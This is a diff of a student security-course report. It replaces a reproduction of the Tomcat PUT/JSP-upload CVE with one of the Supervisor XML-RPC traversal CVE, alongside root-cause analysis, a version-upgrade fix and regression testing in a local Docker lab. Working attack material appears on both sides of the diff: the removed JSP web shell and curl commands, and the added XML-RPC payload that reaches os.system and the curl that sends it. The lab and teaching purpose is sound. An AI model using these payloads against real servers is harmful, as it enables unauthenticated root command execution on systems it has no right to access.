@@ -81,8 +81,8 @@
   <div class="title">Secure REST API Development with<br>CI/CD and Real CVE Vulnerability Analysis</div>
 
   <div class="meta">
-    <div><b>Variant:</b> [Variant N]</div>
-    <div><b>Surname and Name:</b> [Surname Name]</div>
+    <div><b>Variant:</b> Work 1</div>
+    <div><b>Surname and Name:</b> Zhu Borong</div>
     <div><b>HDU number:</b> 23320308</div>
   </div>
 
@@ -102,7 +102,7 @@
       <li>CI/CD security pipeline</li>
     </ol>
   </li>
-  <li>Part II — CVE-2017-12615: Reproduction, Root Cause and Fix
+  <li>Part II — CVE-2017-11610: Reproduction, Root Cause and Fix
     <ol>
       <li>Selected vulnerability</li>
       <li>Vulnerable environment</li>
@@ -132,9 +132,9 @@ The work consists of two connected parts. Part I implements a secure REST API
 with Flask, parameterized database access, output escaping, bcrypt password
 hashing and JWT authentication, and runs static and dependency security scans
 on every push. Part II uses Vulhub and Docker to reproduce
-<strong>CVE-2017-12615</strong> against Apache Tomcat 8.5.19, analyses the
-configuration and input-handling weaknesses that make the attack possible, and
-verifies a remediation based on a patched release and secure configuration.
+<strong>CVE-2017-11610</strong> against Supervisor 3.3.2, analyses the
+XML-RPC method-resolution weakness that makes the attack possible, and verifies
+a remediation based on the patched upstream release.
 </p>
 
 <!-- ============================ 2 PART I ============================ -->
@@ -330,225 +330,196 @@ Last successful pipeline run:
 <div class="caption">Figure 3. SCA job (pip-audit): dependency audit completed successfully.</div>
 
 <!-- ============================ 3 PART II ============================ -->
-<h2 class="page-break">3. Part II — CVE-2017-12615: Reproduction, Root Cause and Fix</h2>
+<h2 class="page-break">3. Part II — CVE-2017-11610: Reproduction, Root Cause and Fix</h2>
 
 <h3>3.1 Selected vulnerability</h3>
 <table>
   <tr><th>Property</th><th>Value</th></tr>
-  <tr><td>CVE</td><td><strong>CVE-2017-12615</strong> — Apache Tomcat
-      DefaultServlet PUT / JSP upload remote code execution</td></tr>
-  <tr><td>CVSS v3.1</td><td><strong>8.1 High</strong>
-      (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</td></tr>
-  <tr><td>Vulnerable component</td><td>Apache Tomcat <code>DefaultServlet</code>,
-      HTTP PUT support, with the <code>readonly</code> initialisation parameter
-      set to <code>false</code></td></tr>
-  <tr><td>Affected releases</td><td>Per NVD, Tomcat 7.0.0–7.0.79 on Windows;
-      the same PUT/JSP-upload weakness is demonstrated by Vulhub on Tomcat
-      8.5.19. The related bypass <strong>CVE-2017-12617</strong> affects
-      8.5.0–8.5.22 and was fixed in 8.5.23.</td></tr>
-  <tr><td>Vulhub path</td><td><code>tomcat/CVE-2017-12615</code></td></tr>
-  <tr><td>Impact</td><td>Unauthenticated file write into the web root,
-      followed by JSP execution as the Tomcat user (root in this container).</td></tr>
+  <tr><td>CVE</td><td><strong>CVE-2017-11610</strong> — Supervisor XML-RPC
+      object traversal / remote command execution</td></tr>
+  <tr><td>CVSS v3.0</td><td><strong>8.8 High</strong>
+      (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)</td></tr>
+  <tr><td>Weakness</td><td>CWE-276 (incorrect default permissions); the
+      practical impact is OS command injection</td></tr>
+  <tr><td>Vulnerable component</td><td>Supervisor XML-RPC dispatcher
+      (<code>supervisor/xmlrpc.py</code>, <code>traverse()</code>)</td></tr>
+  <tr><td>Affected releases</td><td>Supervisor before 3.0.1, 3.1.x before
+      3.1.4, 3.2.x before 3.2.4, 3.3.x before 3.3.3</td></tr>
+  <tr><td>Vulhub environment</td><td><code>supervisor/CVE-2017-11610</code>
+      (Supervisor 3.3.2, XML-RPC on port 9001)</td></tr>
+  <tr><td>Impact</td><td>An XML-RPC request executes arbitrary shell commands
+      as the supervisord process (root in this container).</td></tr>
 </table>
 <p>
-The vulnerability was chosen because the reproduction is short (a build plus two
-HTTP requests), the principle is easy to explain (an insecure DefaultServlet
-configuration combined with an incomplete file-extension check), and the
-impact is unambiguous: remote code execution. It also complements the SQLi/XSS
-protection work in Part I because it demonstrates an input-handling flaw in a
-widely deployed web container.
+NVD describes the attacker as a "remote authenticated user". In the Vulhub
+environment the <code>inet_http_server</code> is exposed on port 9001 without
+credentials, so any client that can reach the port can send the request; the
+lab therefore demonstrates the impact on an exposed management interface. The
+CVSS score remains 8.8 because the underlying flaw requires the interface to
+be reachable and a request to be accepted.
+</p>
+<p>
+The CVE was chosen because the reproduction is a single HTTP request, the
+principle is easy to explain (a dotted XML-RPC method name is resolved by
+walking Python object attributes), and the fix is a well-defined upstream
+change. It is also distinct from the CVEs excluded by the course list.
 </p>
 
 <h3>3.2 Vulnerable environment</h3>
 <p>
-The environment is the official Vulhub compose file at
-<code>vulhub/tomcat/CVE-2017-12615</code>. Its Dockerfile starts from Tomcat
-8.5.19 and injects an insecure <code>readonly=false</code> parameter into
-<code>conf/web.xml</code>:
+Vulhub's <code>supervisor/CVE-2017-11610</code> compose file references the
+prebuilt image <code>vulhub/supervisor:3.3.2</code>. Because the configured
+Docker Hub mirrors rejected that custom image, an equivalent image was built
+from <code>python:2.7-slim</code> and <code>pip install supervisor==3.3.2</code>
+(Supervisor 3.x is Python 2 only; Python 3 support arrived in 4.0). The
+supervisord configuration exposes the XML-RPC interface without authentication:
 </p>
-<pre>&lt;init-param&gt;
-  &lt;param-name&gt;readonly&lt;/param-name&gt;
-  &lt;param-value&gt;false&lt;/param-value&gt;
-&lt;/init-param&gt;</pre>
-<p>
-The container is started with:
-</p>
-<pre>docker compose -f vulhub/tomcat/CVE-2017-12615/docker-compose.yml \
-  --project-directory vulhub/tomcat/CVE-2017-12615 up -d --build</pre>
-<div class="note">
-<strong>Note on the image source.</strong> The configured Docker Hub mirrors
-returned 403/allowlist errors for <code>vulhub/tomcat:8.5.19</code>, so the
-official <code>tomcat:8.5.19-jre8</code> image was pulled and locally tagged as
-<code>vulhub/tomcat:8.5.19</code>. The Vulhub Dockerfile was used unchanged and
-therefore still injects the same <code>readonly=false</code> configuration.
-The vulnerable behaviour is identical.
-</div>
-<p>Confirmed environment properties:</p>
-<pre>Server version: Apache Tomcat/8.5.19
-Server built:   Jul 24 2017 21:01:14 UTC
+<pre>[inet_http_server]
+port=0.0.0.0:9001
 
-119:&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;
-
+[rpcinterface:supervisor]
+supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</pre>
+<p>Start the environment with:</p>
+<pre>docker compose -f supervisor-env/docker-compose.yml up -d --build</pre>
+<p>Confirmed properties:</p>
+<pre>$ docker exec ... supervisord --version
+3.3.2
+$ curl -o /dev/null -w "%{http_code}" http://127.0.0.1:9001/
+200
 $ docker exec ... id
 uid=0(root) gid=0(root) groups=0(root)</pre>
 
 <h3>3.3 Reproduction of the attack</h3>
 <p>
-The attacker needs network access to port 8080 and does not need any
-credentials. The payload is a small JSP page that executes a command passed in
-the <code>cmd</code> parameter:
+The attacker sends an XML-RPC <code>methodCall</code> to <code>/RPC2</code>.
+The method name is not a normal Supervisor RPC method; it is a path through
+the Python object graph that ends at <code>os.system</code>:
 </p>
-<pre>&lt;%@ page contentType="text/plain;charset=UTF-8" pageEncoding="UTF-8" %&gt;
-&lt;%@ page import="java.io.*" %&gt;
-&lt;%
-    String cmd = request.getParameter("cmd");
-    if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
-        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
-        InputStream in = p.getInputStream();
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        byte[] buf = new byte[4096];
-        int n;
-        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
-        response.getWriter().print(out.toString("UTF-8"));
-    }
-%&gt;</pre>
+<pre>&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;string&gt;id &gt; /tmp/rce_proof; touch /tmp/pwned_by_cve_2017_11610&lt;/string&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</pre>
+<p><strong>Step 1 — send the request:</strong></p>
+<pre>curl -i -X POST "http://127.0.0.1:9001/RPC2" \
+     -H "Content-Type: text/xml" \
+     --data-binary "@exploit.xml"
 
-<p><strong>Step 1 — upload the JSP.</strong> The request targets
-<code>/shell.jsp/</code> with a trailing slash. Tomcat's extension check does
-not treat the path as a <code>.jsp</code> write, but the filesystem removes the
-trailing separator and creates <code>shell.jsp</code> in the web root.</p>
-<pre>curl -i -X PUT "http://127.0.0.1:8080/shell.jsp/" \
-     --data-binary "@shell.jsp" \
-     -H "Content-Type: application/octet-stream"
+HTTP/1.1 200 OK
+Content-Type: text/xml
 
-HTTP/1.1 201</pre>
-
-<p><strong>Step 2 — execute commands.</strong> A GET request compiles and runs
-the uploaded page. Because the container runs Tomcat as root, the command
-executes as root.</p>
-<pre>curl "http://127.0.0.1:8080/shell.jsp?cmd=id"
+&lt;?xml version='1.0'?&gt;
+&lt;methodResponse&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;int&gt;0&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodResponse&gt;</pre>
+<p>
+The <code>&lt;int&gt;0&lt;/int&gt;</code> is the exit status returned by
+<code>os.system()</code>, which confirms that the shell command was executed.
+</p>
+<p><strong>Step 2 — read the command output:</strong></p>
+<pre>docker exec supervisor-env-supervisor-1 cat /tmp/rce_proof
 uid=0(root) gid=0(root) groups=0(root)
 
-curl -G "http://127.0.0.1:8080/shell.jsp" \
-     --data-urlencode "cmd=cat /etc/passwd"
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
+docker exec supervisor-env-supervisor-1 ls -l /tmp/pwned_by_cve_2017_11610
+-rw-r--r-- 1 root root 0 Oct 20 03:25 /tmp/pwned_by_cve_2017_11610
 
-curl -G "http://127.0.0.1:8080/shell.jsp" \
-     --data-urlencode "cmd=touch /tmp/pwned_by_cve_2017_12615; ls -l /tmp/pwned_by_cve_2017_12615"
--rw-r----- 1 root root 0 Oct 20 02:21 /tmp/pwned_by_cve_2017_12615</pre>
+docker exec supervisor-env-supervisor-1 supervisord --version
+3.3.2</pre>
 
 <img class="term-img" src="../docs/screenshots/cve-vulnerable.png"
-     alt="Terminal output of the successful CVE-2017-12615 reproduction">
-<div class="caption">Figure 4. Actual output of the reproduction: PUT returns 201, the JSP executes as root, /etc/passwd is read and a marker file is created.</div>
+     alt="Terminal output of the successful CVE-2017-11610 reproduction">
+<div class="caption">Figure 4. Actual output of the reproduction: one XML-RPC request executes id as root and creates a marker file.</div>
 
 <h3>3.4 Root-cause analysis</h3>
 <p>
-The vulnerability is not caused by a single missing quote or a malformed SQL
-query; it is the combination of an insecure configuration and an incomplete
-validation check:
+The flaw is in the XML-RPC dispatch routine, not in a shell command or a SQL
+query:
 </p>
 <ol>
-  <li><strong>PUT is enabled on the default servlet.</strong>
-      <code>DefaultServlet</code> is mapped to <code>/</code>, so it serves the
-      web root. Its secure default is <code>readonly=true</code>. The Vulhub
-      Dockerfile explicitly inserts <code>readonly=false</code>, which turns on
-      the servlet's <code>PUT</code>/<code>DELETE</code> write operations.
-      This is the primary configuration error: a read-only file-serving
-      component is changed into an unauthenticated file-upload interface.</li>
-  <li><strong>The dangerous-extension check is incomplete.</strong>
-      Tomcat tries to prevent direct upload of executable files by rejecting
-      names ending in <code>.jsp</code>. The check is performed on the request
-      path, without reconciling it with the path that the operating system
-      will actually create. A trailing <code>/</code> (and, on other systems,
-      encoded separators or <code>::$DATA</code>) bypasses the suffix test,
-      while the filesystem normalises the trailing separator away. The file
-      is therefore written as <code>shell.jsp</code>, exactly the dangerous
-      type the check was supposed to block. This is a canonicalisation /
-      input-validation flaw (CWE-434, unrestricted upload of a dangerous file
-      type).</li>
-  <li><strong>The uploaded file is executable by design.</strong>
-      The file lands in <code>webapps/ROOT</code>. A later GET is served by the
-      JSP servlet, which compiles and executes it. There is no separate
-      authentication or authorisation step for this execution.</li>
-  <li><strong>The process runs as root.</strong> The official Tomcat image runs
-      the JVM as root, so a web-shell upload escalates directly to root inside
-      the container. This is an aggravating factor rather than the root cause,
-      but it turns a web-application flaw into full control of the container.</li>
+  <li><strong>Dotted method names are resolved by attribute traversal.</strong>
+      The XML-RPC server receives a method name as a string. Supervisor's
+      <code>traverse()</code> split the name on dots and called
+      <code>getattr()</code> once per component, starting from the RPC
+      interface. The only check was that no component began with an
+      underscore.</li>
+  <li><strong>The traversal escapes the intended RPC namespace.</strong>
+      From the <code>supervisor</code> namespace it is possible to reach
+      <code>supervisord</code>, then <code>options</code>, the
+      <code>warnings</code> object and its <code>linecache</code>, and finally
+      Python's <code>os.system</code>. The dispatcher then called the resolved
+      object with attacker-supplied parameters.</li>
+  <li><strong>The process runs with high privileges.</strong> The supervisord
+      process runs as root in the container, so the command inherits root.
+      This is an aggravating factor; the root cause is the over-permissive
+      method resolution.</li>
+  <li><strong>Classification.</strong> NVD assigns CWE-276 (incorrect default
+      permissions) because the management interface exposed far more than the
+      intended RPC methods; the concrete impact is OS command injection
+      (CWE-78).</li>
 </ol>
 <p>
-In our own words: the server was configured to accept write requests it should
-never accept, and the only protection left — a filename suffix blacklist — was
-bypassed because the server checked one representation of the path while the
-filesystem used another. The result is an unauthenticated write of an
-executable JSP into a directory that the server later executes.
+In our own words: Supervisor treated the XML-RPC method name as a path through
+its own Python objects. Instead of allowing only
+<code>namespace.method</code>, it allowed an arbitrarily long chain of
+attributes, and one valid chain ends at <code>os.system</code>. A single
+request to the exposed management port is therefore enough to run commands as
+the supervisord user.
 </p>
 
 <h3>3.5 Applied protection measures</h3>
 <p>
-The fix, stored in <code>vulhub-fix/</code>, combines the vendor's version fix
-with the correct configuration:
+The fix in <code>vulhub-fix/</code> upgrades Supervisor to <strong>3.3.3</strong>,
+the first 3.3.x release containing the upstream correction. The fix commit
+changes <code>traverse()</code> so that:
 </p>
-<ol>
-  <li><strong>Upgrade Tomcat.</strong> The fixed environment uses
-      <code>tomcat:8.5.23-jre8</code>. Tomcat 8.5.23 contains the fix for
-      CVE-2017-12617, the bypass of the CVE-2017-12615 remediation
-      (affected 8.5.0–8.5.22). Using a patched release protects against the
-      bypass even if similar mistakes are made again.</li>
-  <li><strong>Remove the insecure configuration.</strong> The fixed Dockerfile
-      does not insert <code>readonly=false</code>. <code>DefaultServlet</code>
-      therefore keeps its secure default <code>readonly=true</code>, and PUT
-      and DELETE are rejected.</li>
-  <li><strong>Defence in depth (recommended for production).</strong> Keep PUT
-      disabled on static-file servlets; run the servlet container as a
-      non-root user; place an upload/WAF control in front of the application;
-      monitor the web root for unexpected files; and apply the same
-      version-plus-configuration check to all Tomcat instances.</li>
-</ol>
-<pre>--- Dockerfile (vulnerable)
+<ul>
+  <li>the method name must contain exactly two parts
+      (<code>namespace.method</code>); longer attribute chains are rejected;</li>
+  <li>method names beginning with <code>_</code> are rejected;</li>
+  <li>the resolved object must be a bound method
+      (<code>types.MethodType</code>), not an arbitrary callable or module
+      attribute.</li>
+</ul>
+<pre>--- Dockerfile (vulnerable, equivalent to vulhub/supervisor:3.3.2)
 +++ Dockerfile (fixed)
 @@
--FROM vulhub/tomcat:8.5.19
--
--RUN cd /usr/local/tomcat/conf \
--    &amp;&amp; LINE=$(nl -ba web.xml | grep '&lt;load-on-startup&gt;1' | awk '{print $1}') \
--    &amp;&amp; ADDON="&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;" \
--    &amp;&amp; sed -i "$LINE i $ADDON" web.xml
-+FROM tomcat:8.5.23-jre8
-+# readonly remains at its secure default (true); PUT/DELETE are rejected.</pre>
+-FROM python:2.7-slim
+-RUN pip install --no-cache-dir supervisor==3.3.2
++FROM python:2.7-slim
++RUN pip install --no-cache-dir supervisor==3.3.3</pre>
 <p>
-The folder contains <code>Dockerfile</code>, <code>docker-compose.yml</code>,
-<code>diff.patch</code> and a short <code>README.md</code> with the run and
-verification commands.
+The fixed environment therefore keeps the same RPC interface, configuration and
+Python version; only the vulnerable library version changes. For production,
+additional hardening is recommended: bind the XML-RPC interface to a trusted
+management network (or localhost), add authentication and TLS if remote access
+is required, never expose port 9001 to the Internet, and run supervisord as a
+non-root user where possible.
 </p>
 
 <h3>3.6 Verification of the fix and regression testing</h3>
 <p>
-The vulnerable container was stopped with <code>docker compose down</code>, the
-fixed environment was rebuilt with <code>up -d --build</code>, and exactly the
-same exploitation steps were repeated:
+The vulnerable container was stopped, the fixed environment was rebuilt, and
+exactly the same XML-RPC request was sent:
 </p>
-<pre>Server version: Apache Tomcat/8.5.23
-no readonly init-param (secure default true)
-
-PUT /shell.jsp/                     -> HTTP/1.1 403 Forbidden
-GET  /shell.jsp?cmd=id              -> HTTP 404
-GET  /                              -> HTTP 200   (regression)
-GET  /docs/                         -> HTTP 200   (regression)</pre>
+<pre>supervisord --version                    -> 3.3.3
+POST /RPC2 (same exploit.xml)            -> XML-RPC fault: UNKNOWN_METHOD
+/tmp/rce_proof                           -> No such file or directory
+/tmp/pwned_by_cve_2017_11610             -> No such file or directory
+GET /                                    -> HTTP 200   (regression)
+supervisorctl -c /etc/supervisord.conf status
+                                         -> demo RUNNING   (regression)</pre>
 <p>
-The PUT request is now rejected by <code>DefaultServlet</code> before any file
-is written, so the JSP never enters the web root and the subsequent GET returns
-404. The default Tomcat page and the documentation webapp still return 200,
-which confirms that normal read functionality was not damaged by the upgrade or
-the configuration change. This is the required regression test.
+The same request that previously returned <code>&lt;int&gt;0&lt;/int&gt;</code>
+and created files now returns an XML-RPC <code>UNKNOWN_METHOD</code> fault; the
+traversal is rejected before any command can run. At the same time the web
+interface still responds with 200 and the managed process is still RUNNING,
+which confirms that the upgrade did not break normal Supervisor functionality.
 </p>
 
 <img class="term-img" src="../docs/screenshots/cve-fixed.png"
-     alt="Terminal output showing the fixed environment rejecting the attack">
-<div class="caption">Figure 5. Same attack against the fixed environment: PUT 403, webshell 404, while normal pages still return 200.</div>
+     alt="Terminal output showing the fixed Supervisor rejecting the attack">
+<div class="caption">Figure 5. Same attack against Supervisor 3.3.3: UNKNOWN_METHOD, no files created, while the web UI and process supervision still work.</div>
 
-<!-- ============================ 4 CONTROL QUESTIONS ============================ -->
 <h2 class="page-break">4. Answers to Control Questions</h2>
 
 <h3>1. Why is password hashing with bcrypt preferable to SHA-256?</h3>
@@ -613,23 +584,25 @@ vulnerable service on the network, and is difficult to reproduce exactly.
 <h3>6. Describe the difference between a vulnerability and an exploit. What were you reproducing in this work?</h3>
 <p>
 A vulnerability is a weakness in software or configuration (for example,
-DefaultServlet accepting PUT with <code>readonly=false</code> and an incomplete
-suffix check). An exploit is the concrete technique or input that takes
-advantage of that weakness (the PUT request with a trailing slash and a JSP
-payload, followed by a GET that executes it). In this work we reproduced the
-exploit against a deliberately vulnerable Tomcat 8.5.19 container to
-demonstrate the underlying vulnerability and its impact.
+Supervisor 3.3.2 resolving arbitrary dotted XML-RPC method names through the
+Python object graph, which exposes <code>os.system</code>). An exploit is the
+concrete technique or input that takes advantage of that weakness (the crafted
+XML-RPC request whose method name traverses
+<code>supervisord.options.warnings.linecache.os.system</code>). In this work we
+reproduced the exploit against a deliberately vulnerable Supervisor 3.3.2
+container to demonstrate the underlying vulnerability and its impact.
 </p>
 
 <h3>7. Why is it critically important to check that the main functionality of the application has not been damaged after applying a fix (regression testing)?</h3>
 <p>
-Security fixes often change request parsing, file handling or configuration.
-A patch that blocks the attack but also breaks legitimate requests is not an
-acceptable fix. Regression testing proves that both requirements hold: the
-malicious request is rejected and normal functionality still works. In our
-verification the malicious PUT returned 403 and the webshell returned 404,
-while the default page and the documentation webapp still returned 200. Without
-this check we could have “fixed” the service by breaking it.
+Security fixes often change request parsing, dispatch or configuration. A patch
+that blocks the attack but also breaks legitimate requests is not an acceptable
+fix. Regression testing proves that both requirements hold: the malicious
+request is rejected and normal functionality still works. In our verification
+the XML-RPC request returned an <code>UNKNOWN_METHOD</code> fault and no files
+were created, while the web interface returned 200 and
+<code>supervisorctl status</code> still showed the managed process RUNNING.
+Without this check we could have “fixed” the service by breaking it.
 </p>
 
 <h3>8. How does knowledge and the ability to reproduce known CVEs help a security specialist (for example, a pentester or SOC analyst)?</h3>
@@ -655,17 +628,19 @@ three-job GitHub Actions pipeline runs the tests, Bandit SAST and pip-audit SCA
 on every push with zero findings.
 </p>
 <p>
-Part II reproduced CVE-2017-12615 in an isolated Vulhub/Docker environment. The
-attack required only an unauthenticated PUT request and a GET request, yet it
-produced root-level command execution because Tomcat was configured with
-<code>readonly=false</code> and the servlet's JSP-suffix check was bypassed by a
-trailing slash. The fix upgrades Tomcat to 8.5.23 and removes the insecure
-configuration. Repeating the same attack against the fixed environment returns
-403 for the PUT and 404 for the webshell, while normal pages still return 200.
-The exercise demonstrates that configuration errors and incomplete input
-validation can be as dangerous as code-level bugs, and that an effective
-remediation must be verified against both the exploit and the application's
-legitimate functionality.
+Part II reproduced CVE-2017-11610 in an isolated Docker environment modelled
+on the Vulhub Supervisor 3.3.2 setup. A single XML-RPC request used a dotted
+method name to traverse from the RPC namespace to Python's
+<code>os.system</code>, producing root-level command execution. The root cause
+was an over-permissive XML-RPC dispatcher that resolved arbitrary object
+attributes instead of restricting calls to one namespace and one bound method.
+The fix upgrades Supervisor to 3.3.3, whose dispatcher rejects the traversal.
+Repeating the same request now returns an <code>UNKNOWN_METHOD</code> fault and
+no files are created, while the web interface and process management still
+work. The exercise shows that exposed management interfaces and generic
+dispatch mechanisms can turn a legitimate administration feature into remote
+code execution, and that a fix must be verified for both security and normal
+functionality.
 </p>
 
 <!-- ============================ APPENDIX ============================ -->
@@ -679,7 +654,7 @@ legitimate functionality.
   <tr><td>Last successful pipeline</td>
       <td>https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970</td></tr>
   <tr><td>Fix folder</td><td>vulhub-fix/ (Dockerfile, docker-compose.yml,
-      diff.patch, README.md)</td></tr>
+      supervisord.conf, diff.patch, README.md)</td></tr>
   <tr><td>CVE evidence</td><td>docs/cve/evidence/ (raw command output);
       docs/screenshots/cve-vulnerable.png, cve-fixed.png</td></tr>
   <tr><td>CI evidence</td><td>docs/screenshots/ci-run-summary.png,
